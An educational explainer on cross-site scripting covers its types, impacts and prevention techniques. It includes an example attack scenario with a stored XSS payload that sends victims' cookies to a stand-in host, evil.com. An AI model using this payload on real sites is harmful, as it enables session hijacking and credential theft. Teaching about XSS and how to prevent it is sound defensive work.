# Cross-site Scripting (XSS)

---

## Overview

**Cross-site Scripting (XSS)** is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by others. It enables attackers to execute scripts in the context of the victim’s browser.

---

## How XSS Works

- A vulnerable web application accepts user input and reflects it back to users without proper sanitization or encoding.
- The injected script runs in the browser of anyone viewing the affected content.

**Example**:
```html
<script>alert('Hacked');</script>
```

---

## Types of XSS

| Type             | Description |
|------------------|-------------|
| **Stored XSS**   | The malicious script is permanently stored on the server (e.g., in a comment or message) and served to users. |
| **Reflected XSS**| The payload is in the request (e.g., a URL) and immediately reflected in the response. |
| **DOM-based XSS**| The vulnerability exists in client-side JavaScript that processes data insecurely. |

---

## Impacts of XSS

- **Session hijacking**
- **Credential theft**
- **Malicious redirection**
- **Data exfiltration**
- **Drive-by downloads**

---

## Prevention Techniques

- **Input Validation**
  - Reject suspicious or unexpected input.
- **Output Encoding**
  - Encode output data to prevent interpretation as code (e.g., use `&lt;` instead of `<`).
- **Content Security Policy (CSP)**
  - Restrict sources of executable scripts.
- **Use Secure APIs**
  - Prefer APIs that automatically sanitize data (e.g., `textContent` instead of `innerHTML`).
- **Sanitization Libraries**
  - Use trusted libraries (e.g., DOMPurify) to sanitize input.

---

## Example Attack Scenario

1. Attacker submits a comment with a script:
   ```html
   <script>document.location='http://evil.com/cookie?c=' + document.cookie</script>
   ```
2. Script is saved and shown to other users.
3. Victim’s browser runs the script, sending cookies to the attacker.

---

## Summary

Cross-site Scripting is a widespread vulnerability with serious consequences. Proper input validation, output encoding, and secure development practices are essential to prevent it.

---
